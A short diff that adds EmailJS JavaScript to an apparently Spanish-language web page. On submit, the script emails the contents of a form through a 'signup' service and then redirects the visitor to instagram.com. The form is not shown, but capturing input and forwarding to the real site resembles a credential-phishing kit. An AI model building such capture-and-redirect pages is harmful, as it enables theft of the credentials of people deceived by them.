@@ -407,4 +407,20 @@ select.idioma {
             </div>
         </div>
     </footer>
+    <script type="text/javascript">
+  emailjs.init("qd8ZWAiRUxrsk8DBj"); // Reemplaza con tu Public API Key
+
+  document.getElementById("my-form").addEventListener("submit", function(event) {
+    event.preventDefault(); // Evita que el formulario se envíe de forma predeterminada
+
+    emailjs.sendForm("signup", "template_ouizy4c", this) // Usa "signup" como tu Service ID y "template_ouizy4c" como tu Template ID
+      .then(function(response) {
+        console.log("Correo enviado con éxito", response);
+        window.location.href = "https://www.instagram.com"; // Redirige después de enviar
+      }, function(error) {
+        console.error("Error al enviar correo", error);
+      });
+  });
+</script>
+
 </body></html>
